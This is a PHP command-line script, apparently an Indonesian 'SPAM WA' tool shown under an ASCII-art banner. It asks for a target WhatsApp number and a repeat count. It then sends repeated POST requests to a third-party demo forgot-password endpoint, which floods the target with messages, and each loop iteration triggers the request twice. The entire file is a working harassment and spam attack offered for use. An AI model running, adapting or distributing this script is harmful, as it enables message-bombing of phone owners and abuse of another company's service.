<?php
function SpamWae($no_wa) {
	$ch_spmwa_linax = curl_init();
	curl_setopt($ch_spmwa_linax, CURLOPT_URL, 'https://fonnte.com/demo/forgot-password/proses-pesan.php');
	curl_setopt($ch_spmwa_linax, CURLOPT_POSTFIELDS, "nomer=$no_wa");
	curl_setopt($ch_spmwa_linax, CURLOPT_HEADER, 0);
	curl_setopt($ch_spmwa_linax, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch_spmwa_linax, CURLOPT_TIMEOUT,30);
	curl_setopt($ch_spmwa_linax, CURLOPT_POST, 1);
	curl_exec($ch_spmwa_linax);
	$linax_spmwa = curl_exec($ch_spmwa_linax);
	curl_close($ch_spmwa_linax);
	return $linax_spmwa;
}
system('clear');
echo "
 \033[91m[I]==========[ \033[92mView Readme.md For Help (github.com/lutfianam) \033[91m]==========[I]\033[91m
  @@@@@@   @@@@@@@    @@@@@@   @@@@@@@@@@   \033[92m@@@  @@@  @@@   @@@@@@   \033[91m@@@@@@@@  
 @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  \033[92m@@@  @@@  @@@  @@@@@@@@  \033[91m@@@@@@@@  
 !@@       @@!  @@@  @@!  @@@  @@! @@! @@!  \033[92m@@!  @@!  @@!  @@!  @@@  \033[91m@@!       
 !@!       !@!  @!@  !@!  @!@  !@! !@! !@!  \033[92m!@!  !@!  !@!  !@!  @!@  \033[91m!@!       
 !!@@!!    @!@@!@!   @!@!@!@!  @!! !!@ @!@  \033[92m@!!  !!@  @!@  @!@!@!@!  \033[91m@!!!:!    
  !!@!!!   !!@!!!    !!!@!!!!  !@!   ! !@!  \033[92m!@!  !!!  !@!  !!!@!!!!  \033[91m!!!!!:    
      !:!  !!:       !!:  !!!  !!:     !!:  \033[92m!!:  !!:  !!:  !!:  !!!  \033[91m!!:       
     !:!   :!:       :!:  !:!  :!:     :!:  \033[92m:!:  :!:  :!:  :!:  !:!  \033[91m:!:       
 :::: ::    ::       ::   :::  :::     ::    \033[92m:::: :: :::   ::   :::  \033[91m:: ::::  
 :: : :     :         :   : :   :      :      \033[92m:: :  : :     :   : :  \033[91m: :: ::   
 \033[92m[</>]========[ \033[91mCoded By Lutfi Anam | Indonesia Security Lite \033[92m]========[<\>]

";
sleep(2);
echo "\033[92m [+] No. Target : ";
$no_wa = trim(fgets(STDIN));
sleep(1);
echo "\033[92m [+] Jumlah : ";
$jumlah = trim(fgets(STDIN));
sleep(1);

if (is_numeric($no_wa)) {
	for ($i=1; $i <= $jumlah; $i++) {
		echo ' Status : '.SpamWae($no_wa).' Ke '.$no_wa. PHP_EOL;
	}
} else {
	echo " Masukkan Nomor WA Dengan Benar\n Contoh : 08xxxxxxxxxx\n";
}
sleep(7);
